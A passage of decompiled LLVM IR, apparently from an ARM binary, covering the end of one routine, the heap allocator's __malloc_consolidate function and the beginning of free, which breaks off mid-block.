dec_label_pc_f1c8:                                ; preds = %dec_label_pc_f1b0
  %v0_f1c8 = load i32, i32* @r4, align 4
  %v2_f1c8 = sub i32 %v0_f1c8, %v1_f1bc
  store i32 %v2_f1c8, i32* %r0.global-to-local, align 4
  %v9_f1c8 = icmp eq i32 %v0_f1c8, %v1_f1bc
  store i1 %v9_f1c8, i1* @cpsr_z, align 1
  br i1 %v9_f1c8, label %dec_label_pc_f1f4, label %dec_label_pc_f1d0

dec_label_pc_f1d0:                                ; preds = %dec_label_pc_f1c8
  %v0_f1d0 = load i32, i32* @r5, align 4
  %v1_f1d0 = add i32 %v0_f1d0, 872
  %v2_f1d0 = inttoptr i32 %v1_f1d0 to i32*
  %v3_f1d0 = load i32, i32* %v2_f1d0, align 4
  %v1_f1d4 = load i32, i32* @r6, align 4
  %v2_f1d4 = sub i32 %v1_f1d4, %v2_f1c8
  store i32 %v2_f1d4, i32* %r2.global-to-local, align 4
  %v1_f1d8 = add i32 %v0_f1d0, 44
  %v2_f1d8 = inttoptr i32 %v1_f1d8 to i32*
  %v3_f1d8 = load i32, i32* %v2_f1d8, align 4
  store i32 %v3_f1d8, i32* %r1.global-to-local, align 4
  %v2_f1dc = sub i32 %v3_f1d0, %v2_f1c8
  store i32 %v2_f1dc, i32* @r3, align 4
  %v1_f1e0 = or i32 %v2_f1d4, 1
  store i32 %v1_f1e0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_f1dc, i32* %v2_f1d0, align 4
  %v0_f1ec = load i32, i32* %r2.global-to-local, align 4
  %v1_f1ec = load i32, i32* %r1.global-to-local, align 4
  %v2_f1ec = add i32 %v1_f1ec, 4
  %v3_f1ec = inttoptr i32 %v2_f1ec to i32*
  store i32 %v0_f1ec, i32* %v3_f1ec, align 4
  %v1_f200.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f1f8

dec_label_pc_f1f4:                                ; preds = %dec_label_pc_f194, %dec_label_pc_f1c8, %dec_label_pc_f1b0, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f1f8

dec_label_pc_f1f8:                                ; preds = %dec_label_pc_f1d0, %dec_label_pc_f1f4
  %v1_f200 = phi i32 [ %v1_f200.pre, %dec_label_pc_f1d0 ], [ 0, %dec_label_pc_f1f4 ]
  %v2_f1fc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_f1fc, i32* @r4, align 4
  store i32 %v12_f158, i32* @r7, align 4
  ret i32 %v1_f200

; uselistorder directives
  uselistorder i1 %v7_f1c0, { 1, 0 }
  uselistorder i32 %v1_f1bc, { 2, 1, 0, 3 }
  uselistorder i32 %v3_f160, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_f1f8, { 1, 0 }
  uselistorder label %dec_label_pc_f1f4, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f204 = load i32, i32* @r4, align 4
  store i32 %v3_f204, i32* %stack_var_-36, align 4
  %v0_f208 = load i32, i32* @r0, align 4
  %v1_f208 = inttoptr i32 %v0_f208 to i32*
  %v2_f208 = load i32, i32* %v1_f208, align 4
  store i32 %v2_f208, i32* %r3.global-to-local, align 4
  %v2_f20c = icmp eq i32 %v2_f208, 0
  store i32 %v0_f208, i32* @r4, align 4
  br i1 %v2_f20c, label %dec_label_pc_f344.preheader, label %dec_label_pc_f220

dec_label_pc_f344.preheader:                      ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_f34c25 = add i32 %v0_f208, 52
  store i32 %v1_f34c25, i32* %r3.global-to-local, align 4
  %v2_f35426 = add i32 %v0_f208, 60
  %v3_f35427 = inttoptr i32 %v2_f35426 to i32*
  store i32 %v1_f34c25, i32* %v3_f35427, align 4
  %v0_f35828 = load i32, i32* %r3.global-to-local, align 4
  %v2_f35829 = add i32 %v0_f35828, 12
  %v3_f35830 = inttoptr i32 %v2_f35829 to i32*
  store i32 %v0_f35828, i32* %v3_f35830, align 4
  br label %dec_label_pc_f344.dec_label_pc_f344_crit_edge

dec_label_pc_f220:                                ; preds = %entry
  %v1_f220 = and i32 %v2_f208, -3
  %v3_f224 = udiv i32 %v2_f208, 8
  store i32 %v3_f224, i32* %r2.global-to-local, align 4
  store i32 %v1_f220, i32* %v1_f208, align 4
  %v0_f22c = load i32, i32* @r0, align 4
  %v1_f22c = add i32 %v0_f22c, -4
  store i32 %v1_f22c, i32* %r3.global-to-local, align 4
  %v1_f230 = load i32, i32* %r2.global-to-local, align 4
  %v4_f230 = mul i32 %v1_f230, 4
  %v5_f230 = add i32 %v4_f230, %v1_f22c
  store i32 %v5_f230, i32* %sb.global-to-local, align 4
  %v1_f234 = add i32 %v0_f22c, 52
  store i32 %v1_f234, i32* %r7.global-to-local, align 4
  %v1_f238 = add i32 %v0_f22c, 4
  store i32 %v1_f238, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_f240

dec_label_pc_f240:                                ; preds = %dec_label_pc_f33c, %dec_label_pc_f220
  %v1_f33410 = phi i32 [ %v1_f334, %dec_label_pc_f33c ], [ %v5_f230, %dec_label_pc_f220 ]
  %v1_f24c = phi i32 [ %v1_f33c, %dec_label_pc_f33c ], [ %v1_f238, %dec_label_pc_f220 ]
  %v1_f240 = inttoptr i32 %v1_f24c to i32*
  %v2_f240 = load i32, i32* %v1_f240, align 4
  store i32 %v2_f240, i32* %r1.global-to-local, align 4
  %v2_f244 = icmp eq i32 %v2_f240, 0
  br i1 %v2_f244, label %dec_label_pc_f334, label %dec_label_pc_f24c

dec_label_pc_f24c:                                ; preds = %dec_label_pc_f240
  %v0_f24c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_f24c, i32* %v1_f240, align 4
  %v0_f250.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f250

dec_label_pc_f250:                                ; preds = %dec_label_pc_f328, %dec_label_pc_f24c
  %v0_f26c = phi i32 [ %v0_f328, %dec_label_pc_f328 ], [ %v0_f250.pre, %dec_label_pc_f24c ]
  %v1_f250 = add i32 %v0_f26c, 4
  %v2_f250 = inttoptr i32 %v1_f250 to i32*
  %v3_f250 = load i32, i32* %v2_f250, align 4
  store i32 %v3_f250, i32* %r3.global-to-local, align 4
  %v1_f254 = and i32 %v3_f250, -2
  store i32 %v1_f254, i32* %lr.global-to-local, align 4
  %v2_f258 = add i32 %v1_f254, %v0_f26c
  store i32 %v2_f258, i32* @r0, align 4
  %v1_f25c = urem i32 %v3_f250, 2
  %v2_f25c = icmp eq i32 %v1_f25c, 0
  %v1_f260 = add i32 %v0_f26c, 8
  %v2_f260 = inttoptr i32 %v1_f260 to i32*
  %v3_f260 = load i32, i32* %v2_f260, align 4
  store i32 %v3_f260, i32* %sl.global-to-local, align 4
  %v1_f264 = add i32 %v2_f258, 4
  %v2_f264 = inttoptr i32 %v1_f264 to i32*
  %v3_f264 = load i32, i32* %v2_f264, align 4
  store i32 %v3_f264, i32* %r8.global-to-local, align 4
  br i1 %v2_f25c, label %dec_label_pc_f26c, label %dec_label_pc_f2a0

dec_label_pc_f26c:                                ; preds = %dec_label_pc_f250
  %v1_f26c = inttoptr i32 %v0_f26c to i32*
  %v2_f26c = load i32, i32* %v1_f26c, align 4
  store i32 %v2_f26c, i32* %r5.global-to-local, align 4
  %v2_f270 = sub i32 %v0_f26c, %v2_f26c
  store i32 %v2_f270, i32* %r3.global-to-local, align 4
  %v1_f274 = add i32 %v2_f270, 8
  %v2_f274 = inttoptr i32 %v1_f274 to i32*
  %v3_f274 = load i32, i32* %v2_f274, align 4
  store i32 %v3_f274, i32* @ip, align 4
  %v1_f278 = add i32 %v3_f274, 12
  %v2_f278 = inttoptr i32 %v1_f278 to i32*
  %v3_f278 = load i32, i32* %v2_f278, align 4
  store i32 %v3_f278, i32* %r1.global-to-local, align 4
  %v9_f27c = icmp eq i32 %v3_f278, %v2_f270
  %v1_f280 = add i32 %v2_f270, 12
  %v2_f280 = inttoptr i32 %v1_f280 to i32*
  %v3_f280 = load i32, i32* %v2_f280, align 4
  store i32 %v3_f280, i32* %r2.global-to-local, align 4
  br i1 %v9_f27c, label %dec_label_pc_f288, label %dec_label_pc_f2e4

dec_label_pc_f288:                                ; preds = %dec_label_pc_f26c
  %v1_f288 = add i32 %v3_f280, 8
  %v2_f288 = inttoptr i32 %v1_f288 to i32*
  %v3_f288 = load i32, i32* %v2_f288, align 4
  store i32 %v3_f288, i32* %r3.global-to-local, align 4
  %v9_f28c = icmp eq i32 %v3_f288, %v2_f270
  br i1 %v9_f28c, label %dec_label_pc_f294, label %dec_label_pc_f2e4

dec_label_pc_f294:                                ; preds = %dec_label_pc_f288
  store i32 %v3_f274, i32* %v2_f288, align 4
  %v0_f298 = load i32, i32* %r2.global-to-local, align 4
  %v1_f298 = load i32, i32* @ip, align 4
  %v2_f298 = add i32 %v1_f298, 12
  %v3_f298 = inttoptr i32 %v2_f298 to i32*
  store i32 %v0_f298, i32* %v3_f298, align 4
  %v0_f29c = load i32, i32* %lr.global-to-local, align 4
  %v1_f29c = load i32, i32* %r5.global-to-local, align 4
  %v2_f29c = add i32 %v1_f29c, %v0_f29c
  store i32 %v2_f29c, i32* %lr.global-to-local, align 4
  %v0_f2a4.pre = load i32, i32* @r0, align 4
  %v0_f2a8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_f2a0

dec_label_pc_f2a0:                                ; preds = %dec_label_pc_f250, %dec_label_pc_f294
  %v0_f318 = phi i32 [ %v1_f254, %dec_label_pc_f250 ], [ %v2_f29c, %dec_label_pc_f294 ]
  %v0_f2a8 = phi i32 [ %v3_f264, %dec_label_pc_f250 ], [ %v0_f2a8.pre, %dec_label_pc_f294 ]
  %v1_f2bc = phi i32 [ %v2_f258, %dec_label_pc_f250 ], [ %v0_f2a4.pre, %dec_label_pc_f294 ]
  %v0_f2a0 = load i32, i32* @r4, align 4
  %v1_f2a0 = add i32 %v0_f2a0, 44
  %v2_f2a0 = inttoptr i32 %v1_f2a0 to i32*
  %v3_f2a0 = load i32, i32* %v2_f2a0, align 4
  store i32 %v3_f2a0, i32* %r3.global-to-local, align 4
  %v9_f2a4 = icmp eq i32 %v1_f2bc, %v3_f2a0
  %v1_f2a8 = and i32 %v0_f2a8, -4
  store i32 %v1_f2a8, i32* %r5.global-to-local, align 4
  br i1 %v9_f2a4, label %dec_label_pc_f318, label %dec_label_pc_f2b0

dec_label_pc_f2b0:                                ; preds = %dec_label_pc_f2a0
  %v2_f2b0 = add i32 %v1_f2bc, %v1_f2a8
  store i32 %v2_f2b0, i32* %r3.global-to-local, align 4
  %v1_f2b4 = add i32 %v2_f2b0, 4
  %v2_f2b4 = inttoptr i32 %v1_f2b4 to i32*
  %v3_f2b4 = load i32, i32* %v2_f2b4, align 4
  store i32 %v3_f2b4, i32* %r3.global-to-local, align 4
  %v1_f2b8 = urem i32 %v3_f2b4, 2
  %v2_f2b8 = icmp eq i32 %v1_f2b8, 0
  %v2_f2bc = add i32 %v1_f2bc, 4
  %v3_f2bc = inttoptr i32 %v2_f2bc to i32*
  store i32 %v1_f2a8, i32* %v3_f2bc, align 4
  br i1 %v2_f2b8, label %dec_label_pc_f2c4, label %dec_label_pc_f2b0.dec_label_pc_f2f4_crit_edge

dec_label_pc_f2b0.dec_label_pc_f2f4_crit_edge:    ; preds = %dec_label_pc_f2b0
  %v0_f2f8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f2f4

dec_label_pc_f2c4:                                ; preds = %dec_label_pc_f2b0
  %v0_f2c4 = load i32, i32* @r0, align 4
  %v1_f2c4 = add i32 %v0_f2c4, 8
  %v2_f2c4 = inttoptr i32 %v1_f2c4 to i32*
  %v3_f2c4 = load i32, i32* %v2_f2c4, align 4
  store i32 %v3_f2c4, i32* @ip, align 4
  %v1_f2c8 = add i32 %v3_f2c4, 12
  %v2_f2c8 = inttoptr i32 %v1_f2c8 to i32*
  %v3_f2c8 = load i32, i32* %v2_f2c8, align 4
  store i32 %v3_f2c8, i32* %r3.global-to-local, align 4
  %v9_f2cc = icmp eq i32 %v3_f2c8, %v0_f2c4
  %v1_f2d0 = add i32 %v0_f2c4, 12
  %v2_f2d0 = inttoptr i32 %v1_f2d0 to i32*
  %v3_f2d0 = load i32, i32* %v2_f2d0, align 4
  store i32 %v3_f2d0, i32* %r2.global-to-local, align 4
  br i1 %v9_f2cc, label %dec_label_pc_f2d8, label %dec_label_pc_f2e4

dec_label_pc_f2d8:                                ; preds = %dec_label_pc_f2c4
  %v1_f2d8 = add i32 %v3_f2d0, 8
  %v2_f2d8 = inttoptr i32 %v1_f2d8 to i32*
  %v3_f2d8 = load i32, i32* %v2_f2d8, align 4
  store i32 %v3_f2d8, i32* %r3.global-to-local, align 4
  %v9_f2dc = icmp eq i32 %v3_f2d8, %v0_f2c4
  br i1 %v9_f2dc, label %dec_label_pc_f2e8, label %dec_label_pc_f2e4

dec_label_pc_f2e4:                                ; preds = %dec_label_pc_f2c4, %dec_label_pc_f288, %dec_label_pc_f26c, %dec_label_pc_f2d8
  %v0_f2e4 = call i32 @abort()
  store i32 %v0_f2e4, i32* @r0, align 4
  %v0_f2e8.pre = load i32, i32* @ip, align 4
  %v1_f2e8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_f2e8

dec_label_pc_f2e8:                                ; preds = %dec_label_pc_f2d8, %dec_label_pc_f2e4
  %v1_f2e8 = phi i32 [ %v3_f2d0, %dec_label_pc_f2d8 ], [ %v1_f2e8.pre, %dec_label_pc_f2e4 ]
  %v0_f2e8 = phi i32 [ %v3_f2c4, %dec_label_pc_f2d8 ], [ %v0_f2e8.pre, %dec_label_pc_f2e4 ]
  %v2_f2e8 = add i32 %v1_f2e8, 8
  %v3_f2e8 = inttoptr i32 %v2_f2e8 to i32*
  store i32 %v0_f2e8, i32* %v3_f2e8, align 4
  %v0_f2ec = load i32, i32* %r2.global-to-local, align 4
  %v1_f2ec = load i32, i32* @ip, align 4
  %v2_f2ec = add i32 %v1_f2ec, 12
  %v3_f2ec = inttoptr i32 %v2_f2ec to i32*
  store i32 %v0_f2ec, i32* %v3_f2ec, align 4
  %v0_f2f0 = load i32, i32* %lr.global-to-local, align 4
  %v1_f2f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_f2f0 = add i32 %v1_f2f0, %v0_f2f0
  store i32 %v2_f2f0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f2f4

dec_label_pc_f2f4:                                ; preds = %dec_label_pc_f2b0.dec_label_pc_f2f4_crit_edge, %dec_label_pc_f2e8
  %v0_f2f8 = phi i32 [ %v0_f2f8.pre, %dec_label_pc_f2b0.dec_label_pc_f2f4_crit_edge ], [ %v2_f2f0, %dec_label_pc_f2e8 ]
  %v0_f2f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_f2f4 = add i32 %v0_f2f4, 8
  %v2_f2f4 = inttoptr i32 %v1_f2f4 to i32*
  %v3_f2f4 = load i32, i32* %v2_f2f4, align 4
  store i32 %v3_f2f4, i32* %r2.global-to-local, align 4
  %v1_f2f8 = or i32 %v0_f2f8, 1
  store i32 %v1_f2f8, i32* %r3.global-to-local, align 4
  %v0_f2fc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_f2fc, i32* %v2_f2f4, align 4
  %v0_f300 = load i32, i32* %r1.global-to-local, align 4
  %v1_f300 = load i32, i32* %r2.global-to-local, align 4
  %v2_f300 = add i32 %v1_f300, 12
  %v3_f300 = inttoptr i32 %v2_f300 to i32*
  store i32 %v0_f300, i32* %v3_f300, align 4
  %v0_f304 = load i32, i32* %lr.global-to-local, align 4
  %v1_f304 = load i32, i32* %r1.global-to-local, align 4
  %v3_f304 = add i32 %v1_f304, %v0_f304
  %v4_f304 = inttoptr i32 %v3_f304 to i32*
  store i32 %v0_f304, i32* %v4_f304, align 4
  %v0_f308 = load i32, i32* %r3.global-to-local, align 4
  %v1_f308 = load i32, i32* %r1.global-to-local, align 4
  %v2_f308 = add i32 %v1_f308, 4
  %v3_f308 = inttoptr i32 %v2_f308 to i32*
  store i32 %v0_f308, i32* %v3_f308, align 4
  %v0_f30c = load i32, i32* %r2.global-to-local, align 4
  %v1_f30c = load i32, i32* %r1.global-to-local, align 4
  %v2_f30c = add i32 %v1_f30c, 8
  %v3_f30c = inttoptr i32 %v2_f30c to i32*
  store i32 %v0_f30c, i32* %v3_f30c, align 4
  %v0_f310 = load i32, i32* %r7.global-to-local, align 4
  %v1_f310 = load i32, i32* %r1.global-to-local, align 4
  %v2_f310 = add i32 %v1_f310, 12
  %v3_f310 = inttoptr i32 %v2_f310 to i32*
  store i32 %v0_f310, i32* %v3_f310, align 4
  br label %dec_label_pc_f328

dec_label_pc_f318:                                ; preds = %dec_label_pc_f2a0
  %v2_f318 = add i32 %v1_f2a8, %v0_f318
  %v1_f31c = or i32 %v2_f318, 1
  store i32 %v1_f31c, i32* %r3.global-to-local, align 4
  %v1_f320 = load i32, i32* %r1.global-to-local, align 4
  %v2_f320 = add i32 %v1_f320, 4
  %v3_f320 = inttoptr i32 %v2_f320 to i32*
  store i32 %v1_f31c, i32* %v3_f320, align 4
  %v0_f324 = load i32, i32* %r1.global-to-local, align 4
  %v1_f324 = load i32, i32* @r4, align 4
  %v2_f324 = add i32 %v1_f324, 44
  %v3_f324 = inttoptr i32 %v2_f324 to i32*
  store i32 %v0_f324, i32* %v3_f324, align 4
  br label %dec_label_pc_f328

dec_label_pc_f328:                                ; preds = %dec_label_pc_f2f4, %dec_label_pc_f318
  %v0_f328 = load i32, i32* %sl.global-to-local, align 4
  %v2_f328 = icmp eq i32 %v0_f328, 0
  store i32 %v0_f328, i32* %r1.global-to-local, align 4
  br i1 %v2_f328, label %dec_label_pc_f334.loopexit, label %dec_label_pc_f250

dec_label_pc_f334.loopexit:                       ; preds = %dec_label_pc_f328
  %v0_f334.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_f334.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_f334

dec_label_pc_f334:                                ; preds = %dec_label_pc_f334.loopexit, %dec_label_pc_f240
  %v1_f334 = phi i32 [ %v1_f334.pre, %dec_label_pc_f334.loopexit ], [ %v1_f33410, %dec_label_pc_f240 ]
  %v0_f33c = phi i32 [ %v0_f334.pre, %dec_label_pc_f334.loopexit ], [ %v1_f24c, %dec_label_pc_f240 ]
  %v9_f334 = icmp eq i32 %v0_f33c, %v1_f334
  br i1 %v9_f334, label %dec_label_pc_f3ac, label %dec_label_pc_f33c

dec_label_pc_f33c:                                ; preds = %dec_label_pc_f334
  %v1_f33c = add i32 %v0_f33c, 4
  store i32 %v1_f33c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f240

dec_label_pc_f344.dec_label_pc_f344_crit_edge:    ; preds = %dec_label_pc_f344.preheader, %dec_label_pc_f344.dec_label_pc_f344_crit_edge
  %v0_f344.pre = load i32, i32* @r4, align 4
  %v1_f344.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_f344 = mul i32 %v1_f344.pre, 8
  %v5_f344 = add i32 %v4_f344, %v0_f344.pre
  %v1_f348 = add i32 %v1_f344.pre, 1
  store i32 %v1_f348, i32* %r2.global-to-local, align 4
  %v1_f34c = add i32 %v5_f344, 44
  store i32 %v1_f34c, i32* %r3.global-to-local, align 4
  %v2_f354 = add i32 %v5_f344, 52
  %v3_f354 = inttoptr i32 %v2_f354 to i32*
  store i32 %v1_f34c, i32* %v3_f354, align 4
  %v0_f358 = load i32, i32* %r3.global-to-local, align 4
  %v2_f358 = add i32 %v0_f358, 12
  %v3_f358 = inttoptr i32 %v2_f358 to i32*
  store i32 %v0_f358, i32* %v3_f358, align 4
  %v7_f35c = icmp sgt i32 %v1_f348, 95
  br i1 %v7_f35c, label %dec_label_pc_f360, label %dec_label_pc_f344.dec_label_pc_f344_crit_edge

dec_label_pc_f360:                                ; preds = %dec_label_pc_f344.dec_label_pc_f344_crit_edge
  %v0_f360 = load i32, i32* @r4, align 4
  %v1_f360 = inttoptr i32 %v0_f360 to i32*
  %v2_f360 = load i32, i32* %v1_f360, align 4
  store i32 %v2_f360, i32* %r2.global-to-local, align 4
  %v1_f364 = add i32 %v0_f360, 864
  %v2_f364 = inttoptr i32 %v1_f364 to i32*
  %v3_f364 = load i32, i32* %v2_f364, align 4
  %v1_f36c = urem i32 %v2_f360, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_f374 = or i32 %v3_f364, 1
  store i32 %v1_f374, i32* %r1.global-to-local, align 4
  %v1_f378 = or i32 %v1_f36c, 72
  store i32 %v1_f378, i32* %r2.global-to-local, align 4
  %v1_f37c = add i32 %v0_f360, 52
  store i32 %v1_f37c, i32* @ip, align 4
  %v2_f380 = add i32 %v0_f360, 840
  %v3_f380 = inttoptr i32 %v2_f380 to i32*
  store i32 0, i32* %v3_f380, align 4
  store i32 ptrtoint (i32* @global_var_10000.333 to i32), i32* %r3.global-to-local, align 4
  %v0_f388 = load i32, i32* %r0.global-to-local, align 4
  %v1_f388 = load i32, i32* @r4, align 4
  %v2_f388 = add i32 %v1_f388, 836
  %v3_f388 = inttoptr i32 %v2_f388 to i32*
  store i32 %v0_f388, i32* %v3_f388, align 4
  %v0_f38c = load i32, i32* %r0.global-to-local, align 4
  %v1_f38c = load i32, i32* @r4, align 4
  %v2_f38c = add i32 %v1_f38c, 844
  %v3_f38c = inttoptr i32 %v2_f38c to i32*
  store i32 %v0_f38c, i32* %v3_f38c, align 4
  %v1_f390 = load i32, i32* @r4, align 4
  %v2_f390 = add i32 %v1_f390, 852
  %v3_f390 = inttoptr i32 %v2_f390 to i32*
  store i32 ptrtoint (i32* @global_var_10000.333 to i32), i32* %v3_f390, align 4
  %v1_f394 = load i32, i32* @r4, align 4
  %v2_f394 = add i32 %v1_f394, 864
  %v3_f394 = inttoptr i32 %v2_f394 to i32*
  store i32 %v1_f374, i32* %v3_f394, align 4
  %v1_f398 = load i32, i32* @r4, align 4
  %v2_f398 = inttoptr i32 %v1_f398 to i32*
  store i32 %v1_f378, i32* %v2_f398, align 4
  %v0_f39c = load i32, i32* @ip, align 4
  %v1_f39c = load i32, i32* @r4, align 4
  %v2_f39c = add i32 %v1_f39c, 44
  %v3_f39c = inttoptr i32 %v2_f39c to i32*
  store i32 %v0_f39c, i32* %v3_f39c, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_f3a4 = call i32 @sysconf(i32 30, i32 %v1_f374, i32 %v1_f378, i32 ptrtoint (i32* @global_var_10000.333 to i32))
  store i32 %v4_f3a4, i32* @r0, align 4
  %v1_f3a8 = load i32, i32* @r4, align 4
  %v2_f3a8 = add i32 %v1_f3a8, 860
  %v3_f3a8 = inttoptr i32 %v2_f3a8 to i32*
  store i32 %v4_f3a4, i32* %v3_f3a8, align 4
  br label %dec_label_pc_f3ac

dec_label_pc_f3ac:                                ; preds = %dec_label_pc_f334, %dec_label_pc_f360
  %v2_f3b0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f3b0, i32* @r4, align 4
  %v1_f3b4 = load i32, i32* @r0, align 4
  ret i32 %v1_f3b4

; uselistorder directives
  uselistorder i32 %v0_f360, { 1, 0, 2, 3 }
  uselistorder i32 %v0_f358, { 1, 0 }
  uselistorder i32 %v1_f33c, { 1, 0 }
  uselistorder i32 %v0_f328, { 0, 2, 1 }
  uselistorder i32 %v0_f304, { 1, 0 }
  uselistorder i32 %v1_f254, { 1, 0, 2 }
  uselistorder i32 %v0_f26c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_f22c, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 1, 17 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 3, 2, 0, 1 }
  uselistorder i32 852, { 1, 0 }
  uselistorder i32 844, { 1, 0 }
  uselistorder i32 864, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_f3ac, { 1, 0 }
  uselistorder label %dec_label_pc_f344.dec_label_pc_f344_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f328, { 1, 0 }
  uselistorder label %dec_label_pc_f2f4, { 1, 0 }
  uselistorder label %dec_label_pc_f2e8, { 1, 0 }
  uselistorder label %dec_label_pc_f2e4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_f2a0, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_f3b8 = load i32, i32* @r4, align 4
  %v6_f3b8 = load i32, i32* @r5, align 4
  %v9_f3b8 = load i32, i32* @r6, align 4
  %v12_f3b8 = load i32, i32* @r7, align 4
  %v18_f3b8 = load i32, i32* @lr, align 4
  %v0_f3c0 = load i32, i32* @r0, align 4
  store i32 %v0_f3c0, i32* @r6, align 4
  %v2_f3c0 = icmp eq i32 %v0_f3c0, 0
  %v2_f3c4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r7, align 4
  br i1 %v2_f3c0, label %dec_label_pc_f5cc, label %dec_label_pc_f3d0

dec_label_pc_f3d0:                                ; preds = %entry
  store i32 116, i32* %r3.global-to-local, align 4
  %v4_f3d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 116) to i32*), align 4
  store i32 %v4_f3d4, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 %v4_f3d4, i32* %r2.global-to-local, align 4
  %v4_f3e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 72) to i32*), align 4
  store i32 %v4_f3e0, i32* %r1.global-to-local, align 4
  store i32 %v2_f3c4, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_f3ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 120) to i32*), align 4
  store i32 %v4_f3ec, i32* %ip.global-to-local, align 4
  store i32 62456, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_f3ec)
  %v0_f3f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f3f8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_f400 = load i32, i32* @r7, align 4
  %v2_f400 = add i32 %v0_f400, 16
  %v3_f400 = inttoptr i32 %v2_f400 to i32*
  %v4_f400 = load i32, i32* %v3_f400, align 4
  store i32 %v4_f400, i32* %ip.global-to-local, align 4
  store i32 62476, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_f400)
  store i32 68, i32* %r3.global-to-local, align 4
  %v0_f410 = load i32, i32* @r7, align 4
  %v2_f410 = add i32 %v0_f410, 68
  %v3_f410 = inttoptr i32 %v2_f410 to i32*
  %v4_f410 = load i32, i32* %v3_f410, align 4
  store i32 %v4_f410, i32* @lr, align 4
  %v0_f414 = load i32, i32* @r6, align 4
  %v1_f414 = add i32 %v0_f414, -4
  %v2_f414 = inttoptr i32 %v1_f414 to i32*
  %v3_f414 = load i32, i32* %v2_f414, align 4
  store i32 %v3_f414, i32* %r2.global-to-local, align 4
  %v1_f418 = inttoptr i32 %v4_f410 to i32*
  %v2_f418 = load i32, i32* %v1_f418, align 4
  store i32 %v2_f418, i32* %r3.global-to-local, align 4
  %v1_f41c = and i32 %v3_f414, -4
  store i32 %v1_f41c, i32* %ip.global-to-local, align 4
  %v1_f420 = add i32 %v0_f414, -8
  store i32 %v1_f420, i32* @r5, align 4
  store i32 %v1_f420, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_f41c, %v2_f418
  br i1 %tmp, label %dec_label_pc_f450, label %dec_label_pc_f430

dec_label_pc_f430:                                ; preds = %dec_label_pc_f3d0
  %v1_f430 = or i32 %v2_f418, 3
  store i32 %v1_f430, i32* %r3.global-to-local, align 4
  store i32 %v1_f430, i32* %v1_f418, align 4
  %v3_f434 = load i32, i32* @lr, align 4
  %v4_f434 = add i32 %v3_f434, -8
